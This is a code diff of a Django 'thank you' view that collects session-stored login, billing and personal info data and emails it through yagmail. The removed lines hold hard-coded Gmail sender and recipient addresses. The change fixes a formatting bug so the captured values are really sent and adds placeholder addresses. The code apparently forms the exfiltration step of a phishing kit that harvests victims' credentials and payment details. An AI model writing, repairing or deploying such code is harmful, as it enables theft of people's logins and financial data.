@@ -39,19 +39,26 @@ def info_view(request):
 
 
 def thank_you_view(request):
-    login_data = request.session.get('login_data')
-    bill_data = request.session.get('bill_data')
-    info_data = request.session.get('info_data')
+    # Retrieve session data
+    login_data = request.session.get('login_data', 'No login data available')
+    bill_data = request.session.get('bill_data', 'No bill data available')
+    info_data = request.session.get('info_data', 'No info data available')
 
+    # Format the content of the email
+    email_content = f"""
+    Login Data: {login_data}
+    Bill Data: {bill_data}
+    Info Data: {info_data}
+    """
 
     try:
-        yag = yagmail.SMTP('castanedaorlando871@gmail.com')
-
+        # Ensure you have configured yagmail with your email and password securely
+        yag = yagmail.SMTP('your_email@gmail.com')  # Replace with a secure method for loading credentials
         yag.send(
-        to='lyndazuniga2020@gmail.com',
-        subject='Thank You!',
-        contents='{login_data} {bill_data} {info_data}',
-    )
+            to='recipient_email@gmail.com',  # Replace with actual recipient email
+            subject='Thank You!',
+            contents= email_content
+        )
         print("✅ Email sent successfully.")
     except Exception as e:
         print("❌ Failed to send email:", str(e))
